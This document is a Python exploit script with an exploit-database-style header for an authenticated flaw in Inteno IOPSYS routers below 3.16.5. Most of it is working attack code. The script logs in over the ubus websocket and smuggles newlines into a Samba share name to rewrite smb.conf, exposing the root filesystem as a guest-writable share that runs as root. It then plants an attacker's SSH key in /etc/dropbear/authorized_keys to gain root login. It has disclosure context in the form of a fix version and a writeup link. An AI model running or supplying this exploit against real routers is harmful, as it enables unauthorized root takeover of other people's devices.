# Exploit Title: Inteno IOPSYS 3.16.4 - root filesystem access via sambashare (Authenticated)
# Date: 2020-03-29
# Exploit Author: Henrik Pedersen
# Vendor Homepage: https://intenogroup.com/
# Version: Iopsys <3.16.5
# Fixed Version: Iopsys 3.16.5
# Tested on: Kali Linux 2020.4 against an Inteno DG200 Router

# Description:
# It was possible to add newlines to nearly any of the samba share options when creating a new Samba share in Inteno’s Iopsys routers before 3.16.5. This made it possible to change the configurations in smb.conf, giving root access to the filesystem.

# Patch in release
# notes: https://dev.iopsys.eu/iopsys/iopsyswrt/blob/9d2366785d5a7d896359436149c2dbd3caec1a8e/releasenotes/release-notes-IOP-OS-version-3.16.x.txt

# Exploit writeup: https://xistens.gitlab.io/xistens/exploits/iopsys-root-filesystem-access/

#!/usr/bin/python3
import json
import sys
import os
import time
import argparse
from websocket import create_connection
from impacket.smbconnection import SMBConnection
from impacket.examples.smbclient import MiniImpacketShell

"""
Root filesystem access via sambashare name configuration option in Inteno's Iopsys < 3.16.5

Usage: smbexploit.py -u <username> -p <password> -k <path/to/id_rsa.pub> <host>

Requires:
impacket
websocket-client

On Windows:
pyreadline

"""

def ubusAuth(host, username, password):
    """
    https://github.com/neonsea/inteno-exploits/blob/master/cve-2017-17867.py
    """
    ws = create_connection(f"ws://{host}", header = ["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps({
        "jsonrpc": "2.0", "method": "call",
        "params": [
            "00000000000000000000000000000000","session","login",
            {"username": username,"password": password}
        ],
        "id": 666
    })
    ws.send(req)
    response =  json.loads(ws.recv())
    ws.close()
    try:
        key = response.get('result')[1].get('ubus_rpc_session')
    except IndexError:
        return None
    return key

def ubusCall(host, key, namespace, argument, params={}):
    """
    https://github.com/neonsea/inteno-exploits/blob/master/cve-2017-17867.py
    """
    ws = create_connection(f"ws://{host}", header = ["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps({"jsonrpc": "2.0", "method": "call",
        "params": [key,namespace,argument,params],
        "id": 666})
    ws.send(req)
    response =  json.loads(ws.recv())
    ws.close()
    try:
        result = response.get('result')[1]
    except IndexError:
        if response.get('result')[0] == 0:
            return True
        return None
    return result

def auth(host, user, password):
    print("Authenticating...")
    key = ubusAuth(host, user, password)
    if not key:
        print("[-] Auth failed!")
        sys.exit(1)
    print(f"[+] Auth successful")
    return key

def smb_put(args):
    username = ""
    password = ""

    try:
        smbClient = SMBConnection(args.host, args.host, sess_port=445)
        smbClient.login(username, password, args.host)

        print("Reading SSH key")
        try:
            with open(args.key_path, "r") as fd:
                sshkey = fd.read()
        except IOError:
            print(f"[-] Error reading {args.sshkey}")
        
        print("Creating temp file for authorized_keys")
        try:
            with open("authorized_keys", "w") as fd:
                fd.write(sshkey)
                path = os.path.realpath(fd.name)
        except IOError:
            print("[-] Error creating authorized_keys")

        shell = MiniImpacketShell(smbClient)
        shell.onecmd("use pwned")
        shell.onecmd("cd /etc/dropbear")
        shell.onecmd(f"put {fd.name}") 

        print("Cleaning up...")
        os.remove(path)
    except Exception as e:
        print("[-] Error connecting to SMB share:")
        print(str(e))
        sys.exit(1)

def main(args):
    payload = "pwned]\npath=/\nguest ok=yes\nbrowseable=yes\ncreate mask=0755\nwriteable=yes\nforce user=root\n[abc"
    key = auth(args.host, args.user, args.passwd)
    print("Adding Samba share...")
    smbcheck = json.dumps(ubusCall(args.host, key, "uci", "get", {"config":"samba"}))
    if "pwned" in smbcheck:
        print("[*] Samba share seems to already exist, skipping")
    else:
        smba = ubusCall(args.host, key, "uci", "add", {
                "config": "samba", 
                "type":"sambashare", 
                "values": {
                    "name": payload, 
                    "read_only": "no", 
                    "create_mask":"0775", 
                    "dir_mask":"0775",
                    "path": "/mnt/", 
                    "guest_ok": "yes"
                    }
            })
        if not smba:
            print("[-] Adding Samba share failed!")
            sys.exit(1)

    print("Enabling Samba...")
    smbe = ubusCall(args.host, key, "uci", "set",
        {"config":"samba", "type":"samba", "values":
        {"interface":"lan"}})
    if not smbe:
        print("[-] Enabling Samba failed!")
        sys.exit(1)

    print("Committing changes...")
    smbc = ubusCall(args.host, key, "uci", "commit",
        {"config":"samba"})
    if not smbc:
        print("[-] Committing changes failed!")
        sys.exit(1)
    
    if args.key_path:
        # Allow the service to start
        time.sleep(2)
        smb_put(args)
        print(f"[+] Exploit complete. Try \"ssh -i id_rsa root@{args.host}\"")
    else:
        print("[+] Exploit complete, SMB share added.")

def parse_args(args):
    """ Create the arguments """
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="user", help="Username", default="user")
    parser.add_argument("-p", dest="passwd", help="Password", default="user")
    parser.add_argument("-k", dest="key_path", help="Public ssh key path")
    parser.add_argument(dest="host", help="Target host")

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args(args)

if __name__ == "__main__":
    main(parse_args(sys.argv[1:]))